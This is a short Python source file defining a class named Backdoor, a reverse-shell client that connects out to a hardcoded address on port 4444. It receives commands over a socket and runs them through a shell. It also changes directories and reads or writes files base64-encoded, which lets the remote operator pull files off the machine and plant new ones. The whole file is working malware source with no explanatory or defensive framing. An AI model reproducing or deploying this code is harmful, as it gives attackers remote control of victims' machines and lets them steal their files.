
import socket
import subprocess
import json
import os
import base64

class Backdoor:
  def __init__(self,ip,port):
	self.c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	self.c.connect((ip,port))

  def reliable_send(self,data):
	json_data = json.dumps(data)
	self.c.send(json_data)

  def reliable_recv(self):
	json_data = ""
	while True:
	  try:
		json_data = json_data + self.c.recv(1024)
		return json.loads(json_data)
	  except ValueError:
		continue
	  
  def e_s_c(self,command):
	return subprocess.check_output(command,shell=True)


  def cwd(self,path):
	os.chdir(path)
	return "Changing path to " + path

  def read_file(self,path):
	with open(path,"rb") as fr:
		return base64.b64encode(fr.read())

  def write_file(self,path,data):
	with open(path,"wb") as fw:
		fw.write(base64.b64decode(data))
		return "Upload successful!"

  def run(self):
	while True:
		rdata = self.reliable_recv()

		try:
			if rdata[0] == "exit":
				self.c.close()
				exit()
			elif rdata[0] == "cd" and len(rdata)> 1:
				result1 = self.cwd(rdata[1])
			
			elif rdata[0] == "download":
				result1 = self.read_file(rdata[1])
			
			elif rdata[0] == "upload":
				result1 = self.write_file(rdata[1],rdata[2])
			else:	
				result1 = self.e_s_c(rdata)
		except Exception as e:
			result1 = "Command execution error : " + str(e)
		
		self.reliable_send(result1)

myb = Backdoor("192.168.2.54",4444)
myb.run()
